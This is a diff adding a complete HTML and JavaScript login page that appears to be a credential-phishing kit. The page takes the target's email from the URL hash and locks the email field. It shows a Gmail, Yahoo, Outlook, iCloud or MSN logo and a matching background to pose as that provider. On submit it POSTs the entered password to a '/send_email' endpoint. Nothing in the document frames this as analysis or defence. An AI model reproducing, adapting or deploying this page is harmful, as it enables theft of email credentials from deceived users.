@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    html, body {
+      height: 100%;
+      width: 100vw;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      transition: background-image 0.5s ease-in-out;
+      background-size: cover;
+      background-position: center;
+      background-attachment: fixed;
+    }
+    .login-box {
+      background: rgba(255, 255, 255, 0.25);
+      backdrop-filter: blur(12px);
+      border-radius: 18px;
+      box-shadow: 0 8px 32px rgba(31,38,135,0.37);
+      width: 400px;
+      max-width: 95vw;
+      text-align: center;
+      padding: 2.5rem 2rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      gap: 1.2rem;
+    }
+    .brand-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 1rem;
+    }
+    .brand-header img {
+      height: 28px;
+      width: 28px;
+      margin-right: 8px;
+    }
+    .brand-header span {
+      font-weight: bold;
+      font-size: 20px;
+      color: #2c4b84;
+    }
+    .signin-instruction {
+      font-size: 15px;
+      color: #444;
+      margin-bottom: 1.2rem;
+    }
+    input {
+      width: 100%;
+      margin: 0.5rem 0;
+      padding: 0.7rem;
+      font-size: 16px;
+      border: 1.5px solid #bfc9d1;
+      border-radius: 8px;
+      background: rgba(255,255,255,0.7);
+    }
+    input:focus {
+      border-color: #2c4b84;
+      background: rgba(255,255,255,0.95);
+    }
+    button {
+      width: 100%;
+      padding: 0.7rem;
+      background: #004080;
+      color: white;
+      border: none;
+      cursor: pointer;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+    button:hover {
+      background: #002850;
+    }
+    .error {
+      color: red;
+      font-size: 14px;
+      margin-top: 0.8rem;
+      text-align: center;
+      min-height: 22px;
+    }
+  </style>
+</head>
+<body>
+
+  <form id="loginBox" class="login-box" autocomplete="off">
+    <div class="brand-header">
+      <img id="brandLogo" src="" alt="logo" style="display:none;" />
+      <span id="brandName"></span>
+    </div>
+    <div class="signin-instruction">Sign in with correct email credentials</div>
+    <input type="email" name="email" id="emailInput" placeholder="Email" required readonly style="pointer-events: none; background-color: #e9ecef;" />
+    <input type="password" name="password" placeholder="Password" required />
+    <button type="submit" id="signInBtn">Sign in</button>
+    <div class="error" id="errorMsg"></div>
+  </form>
+
+  <script>
+    const logoMap = {
+      "gmail.com": "assets/logos/gmail_logo.png",
+      "yahoo.com": "assets/logos/yahoo_logo.png",
+      "outlook.com": "assets/logos/outlook_logo.png",
+      "hotmail.com": "assets/logos/hotmail_logo.png",
+      "icloud.com": "assets/logos/icloud_logo.png",
+      "msn.com": "assets/logos/msn_logo.png"
+    };
+
+    function getDomain(email) {
+      if (email && email.includes('@')) {
+        return email.split('@')[1].toLowerCase();
+      }
+      return '';
+    }
+
+    // Load email + branding + background
+    window.onload = async function () {
+      const email = decodeURIComponent(window.location.hash.substring(1));
+      const domain = getDomain(email);
+      const emailInput = document.getElementById('emailInput');
+      const brand = document.getElementById('brandName');
+      const logoImg = document.getElementById('brandLogo');
+
+      if (email.includes('@')) {
+        emailInput.value = email;
+        brand.textContent = domain;
+        if (logoMap[domain]) {
+          logoImg.src = logoMap[domain];
+          logoImg.style.display = 'block';
+        }
+      }
+
+      // Try setting background from Node backend
+      try {
+        const response = await fetch(`/get-bg?domain=${domain}`);
+        const data = await response.json();
+        if (data.imageUrl) {
+          document.body.style.backgroundImage = `url('${data.imageUrl}')`;
+        }
+      } catch (err) {
+        console.warn('Failed to load background image from backend:', err);
+      }
+
+      // Show error message if URL contains ?error
+      const params = new URLSearchParams(window.location.search);
+      const errorMsg = document.getElementById('errorMsg');
+      if (params.get('error') === '1') {
+        errorMsg.textContent = 'Incorrect password. Please try again.';
+      } else if (params.get('error') === 'invalid') {
+        errorMsg.textContent = 'Invalid email address.';
+      }
+    };
+
+    // AJAX login handler
+    const loginForm = document.getElementById('loginBox');
+    loginForm.addEventListener('submit', async function (e) {
+      e.preventDefault();
+      const formData = new FormData(loginForm);
+      const errorMsg = document.getElementById('errorMsg');
+
+      try {
+        const response = await fetch('/send_email', {
+          method: 'POST',
+          body: formData
+        });
+        const text = await response.text();
+        errorMsg.textContent = text;
+
+        // Optional: redirect if successful
+        // if (text.includes('Success')) window.location.href = '/dashboard.html';
+
+      } catch (error) {
+        errorMsg.textContent = 'Login failed: ' + error.message;
+      }
+    });
+  </script>
+</body>
+</html>
